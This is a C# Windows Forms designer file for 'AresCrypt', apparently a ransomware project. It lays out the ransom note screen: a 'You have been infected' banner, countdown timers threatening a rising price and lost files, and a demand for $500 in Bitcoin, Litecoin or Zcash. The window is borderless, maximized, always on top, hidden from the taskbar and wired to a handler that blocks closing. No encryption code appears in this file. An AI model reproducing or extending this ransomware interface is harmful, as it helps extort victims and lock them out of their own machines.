namespace arescrypt
{
    partial class Display
    {
        /// <summary>
        /// Required designer variable.
        /// </summary>
        private System.ComponentModel.IContainer components = null;

        /// <summary>
        /// Clean up any resources being used.
        /// </summary>
        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
        protected override void Dispose(bool disposing)
        {
            if (disposing && (components != null))
                components.Dispose();
            base.Dispose(disposing);
        }

        #region Windows Form Designer generated code

        /// <summary>
        /// Required method for Designer support - do not modify
        /// the contents of this method with the code editor.
        /// </summary>
        private void InitializeComponent()
        {
            this.components = new System.ComponentModel.Container();
            System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(Display));
            this.timer1 = new System.Windows.Forms.Timer(this.components);
            this.label1 = new System.Windows.Forms.Label();
            this.textBox1 = new System.Windows.Forms.TextBox();
            this.pictureBox1 = new System.Windows.Forms.PictureBox();
            this.label2 = new System.Windows.Forms.Label();
            this.groupBox1 = new System.Windows.Forms.GroupBox();
            this.paymentTimer = new System.Windows.Forms.Label();
            this.label3 = new System.Windows.Forms.Label();
            this.groupBox2 = new System.Windows.Forms.GroupBox();
            this.lostTimer = new System.Windows.Forms.Label();
            this.label6 = new System.Windows.Forms.Label();
            this.groupBox3 = new System.Windows.Forms.GroupBox();
            this.copyBtn = new System.Windows.Forms.Button();
            this.textBox2 = new System.Windows.Forms.TextBox();
            this.label8 = new System.Windows.Forms.Label();
            this.checkpaymentBtn = new System.Windows.Forms.Button();
            this.decryptBtn = new System.Windows.Forms.Button();
            this.RiseTimer = new System.Windows.Forms.Timer(this.components);
            this.aboutBitcoin = new System.Windows.Forms.LinkLabel();
            this.aboutLitecoin = new System.Windows.Forms.LinkLabel();
            this.aboutZcash = new System.Windows.Forms.LinkLabel();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox1)).BeginInit();
            this.groupBox1.SuspendLayout();
            this.groupBox2.SuspendLayout();
            this.groupBox3.SuspendLayout();
            this.SuspendLayout();
            // 
            // timer1
            // 
            this.timer1.Enabled = true;
            this.timer1.Interval = 1000;
            this.timer1.Tick += new System.EventHandler(this.timer1_Tick);
            // 
            // label1
            // 
            this.label1.Location = new System.Drawing.Point(0, 0);
            this.label1.Name = "label1";
            this.label1.Size = new System.Drawing.Size(100, 23);
            this.label1.TabIndex = 3;
            // 
            // textBox1
            // 
            this.textBox1.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.textBox1.Location = new System.Drawing.Point(247, 49);
            this.textBox1.Multiline = true;
            this.textBox1.Name = "textBox1";
            this.textBox1.ReadOnly = true;
            this.textBox1.ScrollBars = System.Windows.Forms.ScrollBars.Vertical;
            this.textBox1.Size = new System.Drawing.Size(625, 331);
            this.textBox1.TabIndex = 1;
            this.textBox1.Text = resources.GetString("textBox1.Text");
            // 
            // pictureBox1
            // 
            this.pictureBox1.BackgroundImage = ((System.Drawing.Image)(resources.GetObject("pictureBox1.BackgroundImage")));
            this.pictureBox1.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Zoom;
            this.pictureBox1.Location = new System.Drawing.Point(3, 0);
            this.pictureBox1.Name = "pictureBox1";
            this.pictureBox1.Size = new System.Drawing.Size(238, 216);
            this.pictureBox1.TabIndex = 2;
            this.pictureBox1.TabStop = false;
            // 
            // label2
            // 
            this.label2.AutoSize = true;
            this.label2.Font = new System.Drawing.Font("Microsoft Sans Serif", 24F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.label2.ForeColor = System.Drawing.Color.White;
            this.label2.Location = new System.Drawing.Point(259, 9);
            this.label2.Name = "label2";
            this.label2.Size = new System.Drawing.Size(553, 37);
            this.label2.TabIndex = 4;
            this.label2.Text = "You have been infected by AresCrypt!\r\n";
            // 
            // groupBox1
            // 
            this.groupBox1.Controls.Add(this.paymentTimer);
            this.groupBox1.Controls.Add(this.label3);
            this.groupBox1.Location = new System.Drawing.Point(12, 222);
            this.groupBox1.Name = "groupBox1";
            this.groupBox1.Size = new System.Drawing.Size(229, 79);
            this.groupBox1.TabIndex = 5;
            this.groupBox1.TabStop = false;
            // 
            // paymentTimer
            // 
            this.paymentTimer.Font = new System.Drawing.Font("Microsoft Sans Serif", 14.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.paymentTimer.ForeColor = System.Drawing.Color.White;
            this.paymentTimer.Location = new System.Drawing.Point(77, 40);
            this.paymentTimer.Name = "paymentTimer";
            this.paymentTimer.Size = new System.Drawing.Size(87, 24);
            this.paymentTimer.TabIndex = 1;
            this.paymentTimer.Text = "72:00:00\r\n";
            // 
            // label3
            // 
            this.label3.AutoSize = true;
            this.label3.Font = new System.Drawing.Font("Microsoft Sans Serif", 14.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.label3.ForeColor = System.Drawing.Color.White;
            this.label3.Location = new System.Drawing.Point(24, 16);
            this.label3.Name = "label3";
            this.label3.Size = new System.Drawing.Size(187, 24);
            this.label3.TabIndex = 0;
            this.label3.Text = "Payment will Rise On";
            // 
            // groupBox2
            // 
            this.groupBox2.Controls.Add(this.lostTimer);
            this.groupBox2.Controls.Add(this.label6);
            this.groupBox2.Location = new System.Drawing.Point(12, 307);
            this.groupBox2.Name = "groupBox2";
            this.groupBox2.Size = new System.Drawing.Size(229, 79);
            this.groupBox2.TabIndex = 6;
            this.groupBox2.TabStop = false;
            // 
            // lostTimer
            // 
            this.lostTimer.Font = new System.Drawing.Font("Microsoft Sans Serif", 14.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.lostTimer.ForeColor = System.Drawing.Color.White;
            this.lostTimer.Location = new System.Drawing.Point(77, 40);
            this.lostTimer.Name = "lostTimer";
            this.lostTimer.Size = new System.Drawing.Size(87, 24);
            this.lostTimer.TabIndex = 1;
            this.lostTimer.Text = "00:00:00\r\n";
            // 
            // label6
            // 
            this.label6.Font = new System.Drawing.Font("Microsoft Sans Serif", 14.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.label6.ForeColor = System.Drawing.Color.White;
            this.label6.Location = new System.Drawing.Point(18, 16);
            this.label6.Name = "label6";
            this.label6.Size = new System.Drawing.Size(205, 24);
            this.label6.TabIndex = 0;
            this.label6.Text = "Your files will be lost on";
            // 
            // groupBox3
            // 
            this.groupBox3.Controls.Add(this.copyBtn);
            this.groupBox3.Controls.Add(this.textBox2);
            this.groupBox3.Controls.Add(this.label8);
            this.groupBox3.Location = new System.Drawing.Point(247, 386);
            this.groupBox3.Name = "groupBox3";
            this.groupBox3.Size = new System.Drawing.Size(625, 79);
            this.groupBox3.TabIndex = 7;
            this.groupBox3.TabStop = false;
            // 
            // copyBtn
            // 
            this.copyBtn.Font = new System.Drawing.Font("Microsoft Sans Serif", 9.75F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.copyBtn.Location = new System.Drawing.Point(278, 43);
            this.copyBtn.Name = "copyBtn";
            this.copyBtn.Size = new System.Drawing.Size(107, 23);
            this.copyBtn.TabIndex = 8;
            this.copyBtn.Text = "Copy";
            this.copyBtn.UseVisualStyleBackColor = true;
            // 
            // textBox2
            // 
            this.textBox2.Font = new System.Drawing.Font("Microsoft Sans Serif", 9.75F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.textBox2.Location = new System.Drawing.Point(19, 43);
            this.textBox2.Multiline = true;
            this.textBox2.Name = "textBox2";
            this.textBox2.ReadOnly = true;
            this.textBox2.Size = new System.Drawing.Size(253, 23);
            this.textBox2.TabIndex = 1;
            this.textBox2.Text = "Money Address";
            // 
            // label8
            // 
            this.label8.AutoSize = true;
            this.label8.Font = new System.Drawing.Font("Microsoft Sans Serif", 14.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.label8.ForeColor = System.Drawing.Color.White;
            this.label8.Location = new System.Drawing.Point(15, 16);
            this.label8.Name = "label8";
            this.label8.Size = new System.Drawing.Size(531, 24);
            this.label8.TabIndex = 0;
            this.label8.Text = "Send $500 USD worth of bitcoin/Litecoin/Zcash to this address:";
            // 
            // checkpaymentBtn
            // 
            this.checkpaymentBtn.Font = new System.Drawing.Font("Microsoft Sans Serif", 9.75F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.checkpaymentBtn.Location = new System.Drawing.Point(247, 471);
            this.checkpaymentBtn.Name = "checkpaymentBtn";
            this.checkpaymentBtn.Size = new System.Drawing.Size(194, 37);
            this.checkpaymentBtn.TabIndex = 9;
            this.checkpaymentBtn.Text = "Check Payment";
            this.checkpaymentBtn.UseVisualStyleBackColor = true;
            // 
            // decryptBtn
            // 
            this.decryptBtn.Font = new System.Drawing.Font("Microsoft Sans Serif", 9.75F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.decryptBtn.Location = new System.Drawing.Point(678, 471);
            this.decryptBtn.Name = "decryptBtn";
            this.decryptBtn.Size = new System.Drawing.Size(194, 37);
            this.decryptBtn.TabIndex = 10;
            this.decryptBtn.Text = "Decrypt";
            this.decryptBtn.UseVisualStyleBackColor = true;
            // 
            // RiseTimer
            // 
            this.RiseTimer.Enabled = true;
            this.RiseTimer.Interval = 1000;
            this.RiseTimer.Tick += new System.EventHandler(this.RiseTimer_Tick);
            // 
            // aboutBitcoin
            // 
            this.aboutBitcoin.AutoSize = true;
            this.aboutBitcoin.LinkColor = System.Drawing.Color.White;
            this.aboutBitcoin.Location = new System.Drawing.Point(62, 402);
            this.aboutBitcoin.Name = "aboutBitcoin";
            this.aboutBitcoin.Size = new System.Drawing.Size(70, 13);
            this.aboutBitcoin.TabIndex = 11;
            this.aboutBitcoin.TabStop = true;
            this.aboutBitcoin.Text = "About Bitcoin";
            this.aboutBitcoin.LinkClicked += new System.Windows.Forms.LinkLabelLinkClickedEventHandler(this.aboutBitcoin_LinkClicked);
            // 
            // aboutLitecoin
            // 
            this.aboutLitecoin.AutoSize = true;
            this.aboutLitecoin.LinkColor = System.Drawing.Color.White;
            this.aboutLitecoin.Location = new System.Drawing.Point(62, 434);
            this.aboutLitecoin.Name = "aboutLitecoin";
            this.aboutLitecoin.Size = new System.Drawing.Size(76, 13);
            this.aboutLitecoin.TabIndex = 12;
            this.aboutLitecoin.TabStop = true;
            this.aboutLitecoin.Text = "About LiteCoin";
            this.aboutLitecoin.LinkClicked += new System.Windows.Forms.LinkLabelLinkClickedEventHandler(this.aboutLitecoin_LinkClicked);
            // 
            // aboutZcash
            // 
            this.aboutZcash.AutoSize = true;
            this.aboutZcash.LinkColor = System.Drawing.Color.White;
            this.aboutZcash.Location = new System.Drawing.Point(62, 471);
            this.aboutZcash.Name = "aboutZcash";
            this.aboutZcash.Size = new System.Drawing.Size(68, 13);
            this.aboutZcash.TabIndex = 13;
            this.aboutZcash.TabStop = true;
            this.aboutZcash.Text = "About Zcash";
            this.aboutZcash.LinkClicked += new System.Windows.Forms.LinkLabelLinkClickedEventHandler(this.aboutZcash_LinkClicked);
            // 
            // Display
            // 
            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            this.BackColor = System.Drawing.Color.Black;
            this.ClientSize = new System.Drawing.Size(884, 520);
            this.Controls.Add(this.aboutZcash);
            this.Controls.Add(this.aboutLitecoin);
            this.Controls.Add(this.aboutBitcoin);
            this.Controls.Add(this.decryptBtn);
            this.Controls.Add(this.checkpaymentBtn);
            this.Controls.Add(this.groupBox3);
            this.Controls.Add(this.groupBox2);
            this.Controls.Add(this.groupBox1);
            this.Controls.Add(this.label2);
            this.Controls.Add(this.pictureBox1);
            this.Controls.Add(this.textBox1);
            this.Controls.Add(this.label1);
            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
            this.MaximizeBox = false;
            this.MinimizeBox = false;
            this.Name = "Display";
            this.ShowIcon = false;
            this.ShowInTaskbar = false;
            this.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
            this.Text = "AresCrypt";
            this.TopMost = true;
            this.WindowState = System.Windows.Forms.FormWindowState.Maximized;
            this.FormClosing += new System.Windows.Forms.FormClosingEventHandler(this.preventClose);
            this.Load += new System.EventHandler(this.Display_Load);
            this.KeyDown += new System.Windows.Forms.KeyEventHandler(this.keyPressAction);
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox1)).EndInit();
            this.groupBox1.ResumeLayout(false);
            this.groupBox1.PerformLayout();
            this.groupBox2.ResumeLayout(false);
            this.groupBox3.ResumeLayout(false);
            this.groupBox3.PerformLayout();
            this.ResumeLayout(false);
            this.PerformLayout();

        }

        #endregion

        private System.Windows.Forms.Timer timer1;
        private System.Windows.Forms.Label label1;
        private System.Windows.Forms.TextBox textBox1;
        private System.Windows.Forms.PictureBox pictureBox1;
        private System.Windows.Forms.Label label2;
        private System.Windows.Forms.GroupBox groupBox1;
        private System.Windows.Forms.Label paymentTimer;
        private System.Windows.Forms.Label label3;
        private System.Windows.Forms.GroupBox groupBox2;
        private System.Windows.Forms.Label lostTimer;
        private System.Windows.Forms.Label label6;
        private System.Windows.Forms.GroupBox groupBox3;
        private System.Windows.Forms.Button copyBtn;
        private System.Windows.Forms.TextBox textBox2;
        private System.Windows.Forms.Label label8;
        private System.Windows.Forms.Button checkpaymentBtn;
        private System.Windows.Forms.Button decryptBtn;
        private System.Windows.Forms.Timer RiseTimer;
        private System.Windows.Forms.LinkLabel aboutBitcoin;
        private System.Windows.Forms.LinkLabel aboutLitecoin;
        private System.Windows.Forms.LinkLabel aboutZcash;
    }
}